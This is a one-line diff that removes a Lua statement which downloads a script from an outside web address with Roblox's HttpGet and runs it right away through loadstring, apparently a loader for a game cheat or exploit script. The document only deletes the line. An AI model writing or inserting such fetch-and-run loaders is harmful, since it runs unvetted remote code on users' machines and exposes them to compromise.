@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://api.catvape.info/script'), 'loader')()
